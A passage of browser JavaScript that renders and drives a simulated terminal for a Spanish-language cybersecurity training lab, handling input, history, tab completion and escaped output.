  const esc = s => String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
  el.innerHTML = `<div class="term" role="region" aria-label="${esc(t('Terminal del laboratorio'))}">
    <div class="term-bar"><span class="term-dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="term-title">alumno@lab · LabCorp</span></div>
    <div class="term-out" role="log" aria-live="polite"></div>
    <form class="term-line" autocomplete="off"><label class="term-ps" for="${opts.id || 'term-in'}"></label><input id="${opts.id || 'term-in'}" class="term-in" type="text" spellcheck="false" autocapitalize="off" autocorrect="off" aria-label="${esc(t('Escribe un comando'))}"></form>
  </div>`;
  const out = el.querySelector('.term-out'), form = el.querySelector('.term-line'), input = el.querySelector('.term-in'), ps = el.querySelector('.term-ps');
  let hIdx = null;
  const psHTML = () => { const p = sim.prompt(); return `<span class="tp-u">${p.user}@${p.host}</span>:<span class="tp-p">${esc(p.path)}</span>$`; };
  const paintPs = () => { ps.innerHTML = psHTML(); };
  const write = (html, cls) => { const d = document.createElement('div'); d.className = 'term-row' + (cls ? ' ' + cls : ''); d.innerHTML = html; out.appendChild(d); while (out.children.length > 400) out.removeChild(out.firstChild); out.scrollTop = out.scrollHeight; };
  const banner = () => write(esc(t(opts.banner || 'LabCorp · Laboratorio seguro de ciberseguridad\nEscribe help para ver los comandos.')), 'term-muted');
  function exec(line) {
    write(psHTML() + ' ' + esc(line));
    const r = sim.run(line);
    if (r.clear) out.innerHTML = '';
    else if (r.out) write(esc(r.out), r.err ? 'term-err' : '');
    paintPs(); hIdx = null;
    listeners.forEach(fn => { try { fn(r.entry, sim); } catch (e) { console.error(e); } });
    return r;
  }
  form.addEventListener('submit', e => { e.preventDefault(); const v = input.value; input.value = ''; exec(v); });
  input.addEventListener('keydown', e => {
    if (e.key === 'ArrowUp') { e.preventDefault(); if (!sim.history.length) return; hIdx = hIdx === null ? sim.history.length - 1 : Math.max(0, hIdx - 1); input.value = sim.history[hIdx]; }
    else if (e.key === 'ArrowDown') { e.preventDefault(); if (hIdx === null) return; hIdx++; if (hIdx >= sim.history.length) { hIdx = null; input.value = ''; } else input.value = sim.history[hIdx]; }
    else if (e.key === 'Tab') {
      e.preventDefault(); const v = input.value; const c = sim.complete(v); if (!c.length) return;
      const parts = v.split(/\s+/);
      if (c.length === 1) { parts[parts.length - 1] = c[0]; input.value = parts.join(' ') + (c[0].endsWith('/') ? '' : ' '); }
      else { let pre = c[0]; for (const x of c) while (!x.startsWith(pre)) pre = pre.slice(0, -1); if (pre.length > parts[parts.length - 1].length) { parts[parts.length - 1] = pre; input.value = parts.join(' '); } else write(esc(c.join('  ')), 'term-muted'); }
    }
    else if (e.key === 'l' && e.ctrlKey) { e.preventDefault(); out.innerHTML = ''; }
  });
  el.querySelector('.term').addEventListener('click', e => { if (!window.getSelection().toString()) input.focus({ preventScroll: true }); });
  paintPs(); banner();
  return {
    sim, exec,
    onCommand(fn) { listeners.push(fn); },
    insert(text) { input.value = text; input.focus({ preventScroll: true }); },
    focus() { input.focus({ preventScroll: true }); },
    note(text) { write(esc(text), 'term-muted'); },
    reset() { sim.reset(); out.innerHTML = ''; paintPs(); banner(); },
  };
}

global.CyberTerminal = { Sim, mount, ME, HOSTS };
})(window);
